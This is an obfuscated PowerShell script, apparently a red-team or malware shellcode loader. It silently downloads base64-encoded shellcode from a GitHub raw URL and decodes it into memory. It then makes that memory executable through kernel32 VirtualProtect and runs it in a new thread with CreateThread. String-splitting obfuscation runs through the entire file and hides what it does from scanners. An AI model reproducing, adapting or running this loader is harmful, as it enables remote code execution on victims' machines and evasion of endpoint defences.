  $p10M =  [typE]("{1}{0}{2}"-F 'onVEr','C','T') ;   $T1G0  =  [tyPE]("{5}{2}{1}{7}{3}{0}{4}{6}" -F 'R','e.','Tim','ES.mA','S','System.ruN','hAL','InterOpSErviC');  SEt-iTem ('vArIa'+'Ble:0'+'F'+'l'+'t')  ([TyPE]("{0}{1}"-F 'uI','NtPtr')) ;  sET-iTeM varIABLe:3nVPF ( [type]("{1}{2}{0}" -F'R','iNtp','T'))  ;




${eRRor`A`CTio`NP`REfeRENCE} = ("{3}{0}{4}{5}{1}{2}" -f 'lentl','ntin','ue','Si','yC','o')


${B`64`URl} = ("{6}{21}{4}{3}{1}{14}{9}{5}{16}{20}{22}{18}{12}{15}{19}{17}{7}{13}{11}{8}{0}{2}{10}" -f'lcode_','g','b6','w.','/ra','erconte','htt','S','/shel','s','4.txt','aler/main','/','te','ithubu','S','nt.c','n','ouel','imulatio','om/asma','ps:/','er')
${B`64} = (.("{2}{0}{1}" -f'e','ct','New-Obj') ("{4}{0}{3}{2}{1}" -f't.W','lient','bC','e','Ne')).("{2}{1}{3}{0}"-f 'ng','o','Downl','adStri').Invoke(${b64u`RL})


${shel`LCo`de} =  (  vAriAblE  p10M).VaLuE::("{1}{3}{2}{4}{0}"-f 'g','From','ase64','B','Strin').Invoke(${B`64}.("{1}{0}"-f'im','Tr').Invoke())


${S`iZE} = ${Sh`ellC`OdE}."le`N`gTh"
${a`DdR} =   $T1g0::("{1}{3}{0}{2}" -f 'lo','A','bal','llocHG').Invoke(${SI`ZE})


 (  GeT-itEm vARIablE:t1g0  ).vaLUe::("{1}{0}"-f 'y','Cop').Invoke(${S`hEL`lcOde}, 0, ${Ad`Dr}, ${S`Ize})


${O`lD} = 0
${kER`N`EL32} = &("{2}{0}{1}" -f 'dd-Ty','pe','A') -MemberDefinition ((("{47}{99}{52}{120}{70}{38}{96}{0}{36}{45}{28}{50}{92}{105}{85}{117}{19}{74}{25}{11}{10}{97}{78}{98}{23}{63}{89}{13}{2}{125}{7}{34}{5}{56}{65}{82}{115}{46}{62}{71}{40}{83}{1}{67}{109}{6}{107}{64}{15}{8}{21}{37}{12}{66}{53}{54}{87}{32}{72}{101}{61}{58}{73}{14}{113}{27}{31}{35}{108}{77}{24}{20}{59}{48}{106}{103}{86}{76}{26}{121}{3}{116}{29}{88}{81}{9}{75}{124}{30}{22}{55}{33}{80}{114}{57}{41}{122}{102}{42}{94}{126}{119}{69}{84}{110}{49}{79}{44}{43}{39}{4}{112}{91}{18}{123}{90}{60}{100}{111}{68}{95}{16}{17}{51}{118}{93}{104}" -f 'nel32.dll{','2.d','t ','ss, ','bl',')','ublic','tec','ic exter','er, uint','tP','ess, UIn',' ','tect, ou','but','t','ndle,',' uin','static ','otect(IntP','ackS','n','F',',','wSt',' lpAddr','St',' UInt','
    public ','Par','on','Pt','T',' o','t','r','0})',' IntPtr','lImport({0','u','l','l','dId)','p',' ',']','(','{0}','ze,','l{0})]
','static exter','t','[','re','ateT','lags,',';
',' ','At','i','WaitForSingl','ad','{',' uint ','ta','  ','C','ll{0',' h','t({','l','0}kerne','h','tri','tr',' dwCre','p','d',' dw','   ','ut ','met','  [Dl','3','0}ker','ol Virt','r l','hread(IntPtr lp','a','flNewPro','uint ','c ','n b','iseconds);
',';
','Ha','}ker','tr','Size','
    ','eObject(Int','re','ea','t','{0}','o',' IntP',' s',' ','})]
    p','nel32.dl','Ptr','i','es,','uint','lImport','IntPtr lp','ualPr',' dwMill','DllImpor','D','artAddre','pThr','extern ','ati','uint lpflOldPro','    [')) -f [chAr]34) -Name ("{2}{0}{1}"-f 'e','rnel32','K') -Namespace ("{0}{1}"-f'Win3','2') -PassThru

${kE`RnEL`32}::"VIR`TU`ALPr`o`TEct"(${a`dDr}, [UIntPtr]${si`ze}, 0x40, [ref]${O`ld})


${tHREad`iD} = 0
${th`R`eAd} = ${ke`RNel`32}::"cre`AtETh`R`ead"( $3nVPF::"z`ErO",  $0flT::"Z`erO", ${a`Ddr},   (  VARIablE  3nvpF  -vAl )::"ZE`Ro", 0, [ref]${t`HR`ead`Id})
${Ke`RNE`l32}::("{1}{2}{0}{3}" -f 'n','Wa','itForSi','gleObject').Invoke(${t`hRE`Ad}, 0xFFFFFFFF)